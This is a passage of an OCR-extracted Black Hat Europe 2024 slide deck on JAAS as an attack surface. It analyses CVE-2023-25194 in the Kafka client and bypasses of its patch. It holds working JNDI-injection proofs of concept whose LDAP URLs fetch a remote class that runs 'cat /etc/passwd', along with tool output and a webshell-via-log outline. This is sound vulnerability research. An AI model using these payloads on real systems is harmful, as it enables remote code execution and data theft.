---
title: "A Novel Attack Surface Java Authentication and Authorization Service (JAAS)"
speakers: ["ZiYang Li", "Ji'an Zhou", "Ying Zhu"]
conference: "Black Hat"
conference_full: "Black Hat Europe 2024"
edition: "Europe"
year: 2024
source_pdf: "BlackHat_Europe_2024_slides/ZiYang Li & Ji'an Zhou & Ying Zhu_A Novel Attack Surface Java Authentication and Authorization Service (JAAS).pdf"
pages: 125
sha256: "bfc0a664f815883e2236e095e3ecdfdbfd6497002cab83085a3c922e9a522aca"
text_chars: 43346
ocr_pages: 34
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T22:48:46Z"
---
# A Novel Attack Surface Java Authentication and Authorization Service (JAAS)

**Speakers:** ZiYang Li, Ji'an Zhou, Ying Zhu  
**Conference:** Black Hat Europe 2024  
**Source:** `BlackHat_Europe_2024_slides/ZiYang Li & Ji'an Zhou & Ying Zhu_A Novel Attack Surface Java Authentication and Authorization Service (JAAS).pdf` (125 pages)


## Slide 1

A Novel Attack Surface Java Authentication and Authorization Service (JAAS)

Speakers: Ziyang Li, Ji'an Zhou, Ying Zhu

#BHEU @BlackHatEvents

## Slide 2

## About Us

###### **Ziyang Li**

- Security engineer at Alibaba Cloud

- Twitter: @lz2y1

- **Ji'an Zhou**

- Security engineer at Alibaba Cloud

- CTF player at Azure Assassin Alliance (AAA) Team

- Twitter: @azraelxuemo

###### **Ying Zhu**

- Security engineer at Alibaba Cloud

Information Classification: General

#BHEU @BlackHatEvents

## Slide 3

## Agenda

#### 1. Introduction

#### 2. Previous research vs. our findings

3. Hunting for bugs in Java libs

4. Impacts

#### 5. Defense

6. Takeaways

Information Classification: General

#BHEU @BlackHatEvents

## Slide 4

## Agenda

#### **1. Introduction**

🙋

2. Previous research vs. our findings

3. Hunting for bugs in Java libs

4. Impacts

5. Defense

6. Takeaways

Information Classification: General

#BHEU @BlackHatEvents

## Slide 5

## 1.1 What is JAAS

• A popular authentication & authorization framework

• Authentication via username/password, LDAP & Kerberos

Information Classification: General

#BHEU @BlackHatEvents

## Slide 6

## 1.2 How to use JAAS

##### Sample code

###### sample_jaas.config

SampleAcn.main

③

① ②

①Set login config ②Instantiate a LoginContext ③Call the LoginContext’s login method

Information Classification: General

#BHEU @BlackHatEvents

## Slide 7

## 1.2 How to use JAAS

##### Run the sample code

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
1.2 How to use JAAS
Run the sample code
/Library/Java/JavaVirtualMachines/jdk1.8.0_291.jdk
user name: admin
password: admin123
Authentication succeeded!
EA :
+—ARP: SamplePrincipal: admin
Process finished with exit code 0
Information Classification: General
```

## Slide 8

## 1.3 How does JAAS work

##### Core Classes and Interfaces

###### **javax.security.auth.Subject**

- Represents information for an entity e.g. a person, a service

###### **javax.security.auth.login.LoginContext**

- Helps develop an application independent of the underlying authentication technology

- Consults a Configuration to determine the LoginModule(s)

Information Classification: General

#BHEU @BlackHatEvents

## Slide 9

## 1.3 How does JAAS work

##### Core Classes and Interfaces

###### **javax.security.auth.spi.LoginModule**

- Implements different authentication technologies e.g. LDAP, Kerberos

**javax.security.auth.callback.CallbackHandler**

- Communicates with the user to obtain authentication info

**javax.security.auth.callback.Callback**

- The LoginModule passes an array of Callbacks to the CallbackHandler

Information Classification: General

#BHEU @BlackHatEvents

## Slide 10

## 1.3 How does JAAS work

Analyze the sample code

Set login config

SampleAcn.main

Information Classification: General

#BHEU @BlackHatEvents

## Slide 11

## 1.3 How does JAAS work

##### Login config

###### Structure

###### sample_jaas.conf

Information Classification: General

#BHEU @BlackHatEvents

## Slide 12

## 1.3 How does JAAS work

##### **SampleAcn.main**

##### **sample_jaas.conf**

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
1.3 How does JAAS work
public static void main(String[] args) throws Exception{
String propertyName = "java.security.auth. login.config";
System.setProperty(propertyName, "sample_jaas.config");
. LoginContext lc = new LoginContext("Sample", new MyCallbackHandler());
SampleAcn.main Te. login();
System. out.println("Authentication succeeded!");
Subject subject = lc.getSubject();
System. out.println(subject);
}
Sample {
samp le.module.SampleLoginModule required
sample_jaas.conf username = “admin"
password = “admin123";
i
Information Classification: General
```

## Slide 13

## 1.3 How does JAAS work

##### The instantiation process of LoginContext

simplify

Information Classification: General

#BHEU @BlackHatEvents

## Slide 14

## 1.3 How does JAAS work

##### Analyze the LoginContext.login method

SampleAcn.main

Information Classification: General

#BHEU @BlackHatEvents

## Slide 15

## 1.3 How does JAAS work

SampleAcn.main →LoginContext.login

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
1.3 How does JAAS work
SampleAcn.main
— LoginContext.login
@ instantiate |
Subject @ construct ee Ay
LoginContext SampleLoginModule
Information Classification: General
```

## Slide 16

## 1.3 How does JAAS work

SampleAcn.main →LoginContext.login

→SampleLoginModule.initialize

Information Classification: General

#BHEU @BlackHatEvents

## Slide 17

## 1.3 How does JAAS work

SampleAcn.main →LoginContext.login →SampleLoginModule.login

⑤

Information Classification: General

#BHEU @BlackHatEvents

## Slide 18

## 1.3 How does JAAS work

⑦

⑥

SampleAcn.main →LoginContext.login →SampleLoginModule.login →MyCallbackHandler.handle

⑦

⑥ Obtain username, pwd from user

⑦ Return username, pwd

Information Classification: General

#BHEU @BlackHatEvents

## Slide 19

## 1.3 How does JAAS work

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
1.3 How does JAAS work
® Rectertats.
a @ construct Cj
—@ initialize with Subject, CallbackHandler, options-> —B
@ login
LoginContext SampleLoginModule
© handle
@ return username, pwd
—7 <—__————-© obtain username, pwd >
aa
MyCallbackHandler user
Information Classification: General
```

## Slide 20

## 1.3 How does JAAS work

SampleAcn.main →LoginContext.login

→SampleLoginModule.login

⑧

Information Classification: General

#BHEU @BlackHatEvents

## Slide 21

## 1.3 How does JAAS work

⑨

SampleAcn.main →LoginContext.login →SampleLoginModule.commit

Information Classification: General

#BHEU @BlackHatEvents

## Slide 22

## 1.3 How does JAAS work

##### The process of LoginContext.login

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
1.3 How does JAAS work
The process of a
® | ® ee ee
a @ construct 0
—@ initialize with Subject, CallbackHandler, options “AB
® login
LoginContext «—————-© commit, polulate Subject» Samp leLoginModule
© handle
@ return username, pwd
— <—_© obtain username, pwd >
2) :
MyCallbackHandler user
Information Classification: General
```

## Slide 23

## 1.3 How does JAAS work

##### After authentication

🤠 Now you have understood how to use JAAS and how it works.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 24

## Agenda

#### 1. Introduction

#### **2. Previous research vs. our findings**

🙋

3. Hunting for bugs in Java libs

4. Impacts

5. Defense

6. Takeaways

Information Classification: General

#BHEU @BlackHatEvents

## Slide 25

## 2.1 CVE-2023-25194

Control Kafka connection string →Trigger JNDI injection →RCE

Information Classification: General

#BHEU @BlackHatEvents

## Slide 26

## 2.1 CVE-2023-25194

##### PoC

Attacker-controlled

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
2.1 CVE-2023-25194
PoC
public static void main(String[] args) throws Exception{
Properties properties = new Properties();
properties.put("bootstrap.servers", "127.0.0.1:1234");
String deserializer = "org.apache.kafka.common.serialization.StringDeserializer";
properties.put("key.deserializer", deserializer);
properties.put("value.deserializer", deserializer);
properties.put("sasl.mechanism", "PLAIN");
properties. put("security.protocol", "SASL_SSL"); Attacker-controlled
String jaasConfig = “com.sun.security.auth.module.JndiLoginModule required\n" +
"user.provider.url=" +
"\" Ldap: //lLocalhost/hhy LKPnySW/P Lain/Exec/eyJj bwWQi0iJ j YXQgL2VOYy9wYXNzd2QifQ==\"\n" +
"useFirstPass=\"true\"\n" +
"group.provider.url=\"Xxx\";";
properties.put("sasl.jaas.config", jaasConfig);
KafkaConsumer<String, String> kafkaConsumer = new KafkaConsumer<>(properties) ;
kafkaConsumer.close();
Information Classification: General
```

## Slide 27

## 2.1 CVE-2023-25194

##### Run the PoC

🙁 Nothing but an exception

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
2.1 CVE-2023-25194
Run the PoC
JNDI
Caused by: javax.security.auth. login. Create breakpoint : User not found
mn at com.sun.security.auth.module.JndiLoginModule.attemptAuthentication( )
at com.sun.security.auth.module. JndiLoginModule. Login( ) <4 internal lLines>
v at javax.security.auth. Login. LoginContext.invoke( )
=) at javax.security.auth. login. LoginContext.access$000( )
it at javax.security.auth. login. LoginContext$4.run( )
-—t at javax.security.auth. login. LoginContext$4.run( ) <1 internal lLine>
Z at javax.security.auth. Login. LoginContext.invokePriv( )
at javax.security.auth. Login. LoginContext.Login( )
at org.apache.kafka.common.security.authenticator.AbstractLogin. Login( )
‘S Nothing but an exception
Information Classification: General
```

## Slide 28

## 2.1 CVE-2023-25194

##### Check the LDAP Server

① The Kafka client requests the LDAP Server.

base64 decode

② The LDAP Server responds with evil payloads.

③ The Kafka client is taken over.

😎 RCE

Information Classification: General

#BHEU @BlackHatEvents

## Slide 29

## 2.1 CVE-2023-25194

##### 🧐 Are you familiar with it?

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
2.1 CVE-2023-25194
© Are you familiar with it?
public static void main(String[] args) throws Exception{
Properties properties = new Properties();
properties. put("bootstrap.servers", "127.0.0.1:1234");
String deserializer = "org.apache.kafka.common.serialization.StringDeserializer";
properties. put("key.deserializer", deserializer) ;
properties.put("value.deserializer", deserializer);
properties. put("sasl.mechanism", "PLAIN");
properties.put("security.protocol", "SASL_SSL");
String jaasConfig = "com.sun.security.auth.module.JndiLoginModule required\n" +
"user.provider.url=" +
"\" Ldap: //localhost/hhy \KPnySW/Plain/Exec/eyJ j bwQi0iJ j YXQgL2VOYy9wYXNzd2QifQ==\"\n" +
"useFirstPass=\"true\"\n" +
"group.provider.url=\"xxx\"3 "5
properties.put("sasl.jaas.config", jaasConfig);
KafkaConsumer<String, String> kafkaConsumer = new KafkaConsumer<>(properties);
kafkaConsumer.close();
Information Classification: General
```

## Slide 30

## 2.2 Similarities and differences

##### **PoC**

😲 So similar

##### **Sample code**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 31

## 2.2 Similarities and differences

🤔 What is the relationship between Kafka client and JAAS?

Information Classification: General

#BHEU @BlackHatEvents

## Slide 32

## 2.2 Similarities and differences Review the exception of the PoC

😎 It seems familiar.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 33

## 2.2 Similarities and differences

##### Debugging the PoC

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
2.2 Similarities and differences
Debugging the PoC
public LoginContext login() throws LoginException {
loginContext = new LoginContext(contextName, (@@SE8Bnvi1, loginCallbackHandler, configuration);
LoginContext.login();
Log.info("Successfully logged in.");
return LoginContext;
}
Debug: 4 JNDI
@ Debugger Console = &@A + tT ™
¥ "main"@1 in group "main": RUNNING Yi.
this = {DefaultLogin@1397}
Information Classification: General
D> © login:59, AbstractLogin (org.apache.kafka.common.security.authenticator) >
(org.apache.kafka.common.security.authenticator >
(org.apache.kafka.common.secui >
a (org.apache.kafka.common.network) >
° (org.apache.kafka.common.network)
(org.apache.kafka.common.netwt
B (org.apache.kafka.clients)
re (org.apache.kafka.clients.consumer)
(org.apache.kafka.clients.consumer)
x (org.apache.kafka.clients.consumer)
} (org.apache.kafka.clients.consumer)
Rp main:22, JNDI (kafka)
contextName = "KafkaClient"
loginCallbackHandler = {AbstractLogin$DefaultLoginCallbac
configuration = {JaasConfig@1402}
loginContext = null
```

## Slide 34

## 2.2 Similarities and differences

##### **Kafka client**

😲 So similar

**Sample code**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 35

## 2.2 Similarities and differences

🤔 There is something different. What is it?

Information Classification: General

#BHEU @BlackHatEvents

## Slide 36

## 2.2 Similarities and differences

##### **Kafka client**

##### **Sample code**

🧐 Here’ the difference.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 37

## 2.2 Similarities and differences How Kafka client instantiates the LoginContext

simplify

Information Classification: General

#BHEU @BlackHatEvents

## Slide 38

## 2.2 Similarities and differences

##### **Sample code**

##### **Kafka client**

😎 This is the only difference.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 39

## 2.3 The principle of CVE-2023-25194

##### The process of LoginContext.login

JNDI.main →LoginContext.login

Information Classification: General

#BHEU @BlackHatEvents

## Slide 40

## 2.3 The principle of CVE-2023-25194 JndiLoginModule.login

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
2.3 The principle of CVE-2023-25194
JndiLoginModule.login
private void attemptAuthentication(boolean getPasswdFromSharedState)
throws LoginException {
String encryptedPassword = null;
// first get the username and password
getUsernamePassword(getPasswdFromSharedState) ;
try {
// get the user's passwd entry from the user provider URL
InitialContext iCtx = new InitialContext();
| + "Idap://localhost/hhylKPnySW/Plain/Exec/eyJjbWQiOiJj YXQgL2VOYy9wYXNzd2QifQ==" |
|
Debug: | JNDI
@ Debugger Console =| & + * % A
* "main"@1 in group "main": RUNNING Yv
Information Classification: General
)p| © attemptAuthentication:526, JndiLoginModule (com.sun.security.auth.modt
(com.sun.security.auth.module)
(sun.reflect)
this = {JndiLoginModule@1424}
Variables debug info not available
P getPasswdFromSharedState = true
```

## Slide 41

## 2.3 The principle of CVE-2023-25194 InitialContext.lookup

- A common sink, like Runtime.exec, ObjectInputStream.readObject

- Lookup with an untrusted address leads to RCE

Information Classification: General

#BHEU @BlackHatEvents

## Slide 42

## 2.3 The principle of CVE-2023-25194

##### Analyze the code

Attacker-controlled

Information Classification: General

#BHEU @BlackHatEvents

## Slide 43

## 2.3 The principle of CVE-2023-25194

##### Analyze the code

Attacker-controlled

Information Classification: General

#BHEU @BlackHatEvents

## Slide 44

## 2.3 The principle of CVE-2023-25194 The attack process

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
2.3 The principle of CVE-2023-25194
The attack process
JVM
@ fostentiatesty
he © construct oO
—@ initialize with Subject, CallbackHandler, options -H5
@® login
LoginContext JndiLoginModule
t
@® set config & login
® lookup
Kafka client
+ ;
@ connection string © payload
@ taken over Bw
a —<— ee)
Kt
@ set up >)
7)
Information Classification: General
Attacker Evil JNDI Server
```

## Slide 45

## 2.3 The principle of CVE-2023-25194 🤔 What about the Sample code

###### sample_jaas.conf

Information Classification: General

#BHEU @BlackHatEvents

## Slide 46

## 2.3 The principle of CVE-2023-25194 Run the sample code again

😎 RCE Again

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
2.3 The principle of CVE-2023-25194
Run the sample code again
© SampleAcn.java
public static void main(String[] args) throws Exception{
String propertyName = "java.security.auth.login.config";
System.setProperty(propertyName, "sample_jaas.config");
LoginContext lc = new LoginContext( name: "Sample", new MyCallb
lc.login();
System.out.println("Authentication succeeded!");
Subiect subiect = 1lc.aetSubiect():
<2, sample_jaas.config
Sample {
com.sun.security.auth.module.JndiLoginModule required
user. provider.url="ldap://Localhost/hhylKPnySW/Plain/Exec/eyJjbWQi0
useFirstPass="true"
group. provider. url="Xxxx";
be
Run: SampleAcn
Exception in thread "main" javax.security.auth. login. pi
at com.sun.security.auth.module.JndiLoginModule.attemptAuthentical
at com.sun.security.auth.module.JndiLoginModule.login( of
auth.
auth. Login.
auth.
auth. Login.
auth.
auth
»
€>
at javax.security. Login. LoginContext.invoke(
security. LoginContext.access$000(
j-
at javax.
ke
at javax.security. Login. LoginContext$4.run(
security. LoginContext$4.run(
>
at javax.
a} qi
security. Login. LoginContext.invokePriv(
I+
i"
at javax.
- at
Information Classification: General
javax.security. - Login. LoginContext.loqgin(
jo
JNDInjector v1.1
HK
HOST: localhost RELIP HTTP O: 80 LDAPi®O: 389
ARS RAS : @ LDAP HTTP
WR AR KF
() X2ISA (127.0.0.1] ALDAPIR :|hhylKPnySW/Plain/Exec/eyJjbWQiOiJjYXQgL2VOY y9wY XNzd2QifQ==
[!] LDAPiBRi¥6 :
RWS : hhyliKPnySw
Gadget : Plain
Payload : Exec
SHR:
{"cmd":"cat /etc/passwd"}
[!] IE# Rik codebase:http://localhost/MTI3LjAUMC4x/hhylKPnySW/Plain/Exec/eyJjbW QiOiJjYXQgL2VOY yQwY x!
(!] KAIHTTPIAR : /MTISLJAUMC4x/hhylKPnySW/Plain/Exec/eyJjbWQiOiJjYXQgL2V0Yy9wY XNzd2QifQ==/Exeq
() ABR [MTISL|AUMC4x]) HELE
Hit
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode. At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory. :
2:-2:Unprivileged User:/var/empty:/usr/bin/false
:0:0:System Administrator:/var/root:/bin/sh
```

## Slide 47

## 2.3 The principle of CVE-2023-25194

##### The attack process

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
2.3 The principle of CVE-2023-25194
The attack process
JVM
@ instantiate |
Subject © construct oO
lens —@ initialize with Subject, CallbackHandler, options-> H5
@ login e
LoginContext JndiLoginModule
A
® set config & login
Ee
[2ava lookup
Kafka client SampleAcn,java
@ evil login config © payload
@ connection string
Bw taken over
| <5.
ys @ set up <3
Information Classification: General Attacker Evil JNDI Server
EU.
```

## Slide 48

## 2.3 The principle of CVE-2023-25194

- 😎 Controllable login config can lead to RCE.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 49

## 2.4 The patch of CVE-2023-25194

##### The patch

By default, JndiLoginModule is disabled in Apache Kafka 3.4.0.

Information Classification: General

#BHEU @BlackHatEvents

## Slide 50

## 2.4 The patch of CVE-2023-25194

##### How the patch works

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
2.4 The patch of CVE-2023-25194
How the patch works
JVM
® eam
aie © construct F)
—@ initialize with Subject, CallbackHandler, options-> ba
login >
LoginContext JndiLoginModule
t
@ set config & login
<_——
® check login config
er)
Kafka client
A
T
@ connection string
o
Information Classification: General Attacker Evil JNDI Server
LE
```

## Slide 51

## 2.4 The patch of CVE-2023-25194

🤔 Can we bypass?

Information Classification: General

#BHEU @BlackHatEvents

## Slide 52

## 2.5 The first idea to bypass

##### Goal: Find other LoginModules

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
2.5 The first idea to bypass
Goal: Find other LoginModules
JVM
@ instantiate |
Subject © construct
[re — @ initialize with Subject, CallbackHandler, options—>
@® login >
LoginContext ?LoginModule
© set config & login i sais
1
@ check login config
pie eel
Kafka client
@ connection string
Lc]
ns © taken over
Attacker
Information Classification: General
```

## Slide 53

## 2.5 The first idea to bypass Restrictions on the LoginModules

- Implement javax.security.auth.spi.LoginModule

- Exist in popular Java libs

- Can trigger RCE, Arbitrary File Write, Arbitrary File Read, etc

Information Classification: General

#BHEU @BlackHatEvents

## Slide 54

## 2.5 The first idea to bypass ProxyLoginModule

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
2.5 The first idea to bypass
ProxyLoginModule
public void initialize(Subject subject,
CallbackHandler callbackHandler, Map<String, ?> sharedState,
Map<String, ?> options) { @ instantiate
this.moduleName = (String)options.get("moduleName") ; Subject @ construct 0
if (this.moduleName != null) { 3s ———@ initialize—_> H5
ClassLoader loader = SecurityActions.getContextClassLoader(); .
try { ® login-————-
Class<?> clazz = loader. loadClass(this.moduleName) ; LoginContext r— ProxyLoginModule
this.delegate = (LoginModule)clazz.newInstance();
} catch (Throwable var8) { |
var8.printStackTrace(); 4G truct © logi
ee @ construc © login
} &initialize
this.delegate.initialize(subject, callbackHandler, sharedState, options);
O
public boolean login() throws LoginException {
@ @
return this.delegate. login(); @ ®
e JBoss
Information Classification: General @ @ by Red Hat
AgentLoginModule
```

## Slide 55

## 2.5 The first idea to bypass RCE via ProxyLoginModule

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
Run:
- t
+
Information Classification: General
}
2.5 The first idea to bypass
RCE via ProxyLoginModule
String jaasConfig = "org.jboss.security.auth.spi.ProxyLoginModule required\n" +
"moduLeName=\"com.sun.security.auth.module.JndiLoginModule\"\n" +
"user.provider.url=" +
"\"Ldap://LocalLhost/hhylKPnySW/PLain/Exec/eyJjbWQi0iJjYXQgL2VOYy9wYXNzd2QifQ==\"\n" +
“useFirstPass=\"true\"\n" +
"group.provider.url=\"Xxxx\";";
System.out.println(jaasConfig);
properties.put("sasl.jaas.config", jaasConfig);
KafkaConsumer<String, String> kafkaConsumer = new KafkaConsumer<>(properties);
kafkaConsumer.close();
JbossBypass
Caused
at
by: javax.security.auth. login. Create breakpoint : User not found
com.sun.security.auth.module.JndiLoginModule.attemptAuthentication( )
at
at
com.sun.security.auth.module.JndiLoginModule. lLogin( ! )
org. jboss.security.auth.spi.ProxyLoginModule. lLogin(P )| <4 internal Lines>
```

## Slide 56

## 2.5 The first idea to bypass

base64 decode

😎 RCE Again

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
gQ ~ ——— ” ~
black hat = +
EUROPE 2024 /
2.9 The first idea to bypass
IF Am RF
[QHTTP ARS RR , EE Tie O80...
[!] LDAP ARS RR , TEES OTe 389...
(!] WENA (127.0.0.1] BLDAPIBR : hhyiKPnySW/Plain/Exec/eyJjbWQiOiJjYXQgL2VOY y9wY XNzd2QifQ==
[!] LDAPiBRi¥1é :
R4S : hhyiKPnySwW
Gadget : Plain
Payload : Exec
SR:
{"cmd":"cat /etc/passwd"}
[!] IE#E RiKcodebase:http://localhost/MTI3LjAuUMC4x/hhylKPnySW/Plain/Exec/eyJjbWQiOiJjYXQgL2VO0Yy9wY XNzd2QifQ==
[!] KBIHTTPISR : /MTI3Lj{AUMC4x/hhylIKPnySW/Plain/Exec/eyJjbW QiOiJjYXQgL2VOY y9wY XNzd2QifQ==/Exec.class
() ABR [MTISL|AUMC4x] HABER :
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode. At other times this information is provided by
# Open Directory.
it
# See the opendirectoryd(8) man page for additional information about
# Open Directory!
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false es)
root:*:0:0:System Administrator:/var/root:/bin/sh
Information Classification: General
```

## Slide 57

## 2.5 The first idea to bypass

##### The attack process

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
2.5 The first idea to bypass
The attack process
© instantiate |
Subject © construct oO
fice. —@ initialize with Subject, CallbackHandler, options H5
© login >
LoginContext r— ProxyLoginModule
t |
@ set config & login ® construct = @ login
JVM
&initialize |
: O
@® check login config
ee SY
Kafka client JNDILoginModule
I
4 1) lookup
@ connection string o :
\ 13) taken over Bw
Eee
|
Attacker Evil JNDI Server
Information Classification: General
```

## Slide 58

## 2.5 The first idea to bypass

##### Arbitrary File Write via two LoginModules

① Prepare log.conf

② Send payload1 to specify the log config

- ③ Send payload2 →Trigger an error →Write error log messages (with malicious content)

Information Classification: General

#BHEU @BlackHatEvents

## Slide 59

## 2.5 The first idea to bypass

##### Arbitrary File Write via two LoginModules

④ Utilize the webshell

😎 RCE Again

Information Classification: General

#BHEU @BlackHatEvents

## Slide 60

## 2.6 The second idea to bypass

##### LdapLoginModule

Obtain name, pwd via a CallbackHandler

Check if the pwd is blank

If not blank, trigger JNDI lookup

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 61

## 2.6 The second idea to bypass

##### Goal: Find a CallbackHandler for LdapLoginModule

* adapted from a real vulnerability

Information Classification: General

#BHEU @BlackHatEvents

## Slide 62

## 2.6 The second idea to bypass

##### Restrictions on the CallbackHandlers

- Can handle NameCallback, PasswordCallback (no exception)

   - Can obtain password (not blank)

-

- Implement org.apache.kafka.common.security.auth.AuthenticateCallbackHandler

Can’t handle NameCallback

May raise ClassCastException

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 63

## 2.6 The second idea to bypass

😵 Which vendors implemented the interfaces of Kafka?

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 64

## 2.6 The second idea to bypass

##### FileCallbackHandler

Obtain name, pwd from a local file

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 65

## 2.6 The second idea to bypass The simplified code of FileCallbackHandler

Separated by colon

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 66

## 2.6 The second idea to bypass

##### Almost there?

✅ Implement org.apache.kafka.common.security.auth.AuthenticateCallbackHandler

✅ Can handle NameCallback, PasswordCallback (no exception)

✅ Can obtain password (not blank)

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 67

## 2.6 The second idea to bypass

**The file named user.conf is created by us.** 🤔 **Can we find a more common one?**

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 68

## 2.6 The second idea to bypass 🥳 **Absolutely!**

Information Classification: General

#BHEU @BlackHatEvents

* adapted from a real vulnerability

## Slide 69

## 2.6 The second idea to bypass

##### RCE via LdapLoginModule

###### Kafka client

😎 RCE Again

JNDI Server

* adapted from a real vulnerability

Information Classification: General

#BHEU @BlackHatEvents

## Slide 70

## 2.6 The second idea to bypass

##### The attack process

* adapted from a real vulnerability

Information Classification: General

#BHEU @BlackHatEvents

## Slide 71

## Agenda

#### 1. Introduction

2. Previous research vs. our findings

**3. Hunting for bugs in Java libs** 4. Impacts

🙋

5. Defense

6. Takeaways

Information Classification: General

#BHEU @BlackHatEvents

## Slide 72

## 3.1 Why we started

##### Review the root cause

###### Attacker-controlled

😈

Information Classification: General

#BHEU @BlackHatEvents

## Slide 73

## 3.1 Why we started

🤔 What else besides the Kafka client?

Information Classification: General

#BHEU @BlackHatEvents

## Slide 74

## 3.2 How we hunted bugs

##### **JAAS is widely used.**

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
3.2 How we hunted bugs
JAAS is widely used.
Go gle "jaas" "authentication" x
{=
a)
Jo)
e« IBM
= https://www.ibm.com > rzaha > rzahajaas10 - Fuh:
Java Authentication and Authorization Service (JAAS) 1.0
The Java Authentication and Authorization Service (JAAS) is a standard extension to the Java 2
Software Development Kit, version 1.3.
TheServerSide
https://www.theserverside.com > definition - HiZL5T
What is Java Authentication and Authorization Service ...
The Java Authentication and Authorization Service (JAAS) is a set of application program
interfaces (APIs) that can determine the identity of a user or ...
Hazelcast Documentation
https://docs.hazelcast.com > security » jaas-a... - BZubH
JAAS Authentication
The jaas authentication setting is the most flexible form of authentication, but requires
knowledge of JAAS login modules and related concepts. You can use ...
Information Classification: General
```

## Slide 75

## 3.2 How we hunted bugs

🤔 How to analyze as many as possible Java libs that used JAAS?

Information Classification: General

#BHEU @BlackHatEvents

## Slide 76

## 3.2 How we hunted bugs

##### **1. Summarize Sinks**

##### **2. Download Java libs in bulk**

**3. Analyze automatically and manually**

Information Classification: General

#BHEU @BlackHatEvents

## Slide 77

## 3.2 How we hunted bugs

##### Summarize sinks

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
3.2 How we hunted bugs
Summarize sinks
new LoginContext(?, ?, ?, Configuration) //Configuration -> attacker-controlled
System.setProperty("java.security.auth. login.config", "<attacker-controlled>")
System.setProperty("login.config.url.${numeric}", "<attacker-controlled>")
Information Classification: General
```

## Slide 78

## 3.2 How we hunted bugs Why they work

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
3.2 How we hunted bugs
Why they work
new LoginContext(?, ?, ?, Configuration) //Configuration -> attacker-controlled
System. setProperty("java.security.auth. login.config", "<attacker-—controlled>")
System.setProperty("login.config.url.${numeric}", "<attacker-controlled>")
Information Classification: General
```

## Slide 79

## 3.2 How we hunted bugs

😮 It can be a remote address!

Information Classification: General

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
'*)
black hat
EUROPE 2024
3.2 How we hunted bugs
public static void main(String[] args) throws Exception{
String propertyName = "java.security.auth. login.config";
Information Classification: General
System. setProperty(propertyName,
"http: //<remote_host>/sample_jaas.config");
LoginContext lc = new LoginContext("Sample", new MyCallbackHandler());
lc. login();
System.out.println("Authentication succeeded!");
Subject subject = lc.getSubject();
System.out.println(subject);
It can be a remote address!
```

## Slide 80

## 3.2 How we hunted bugs

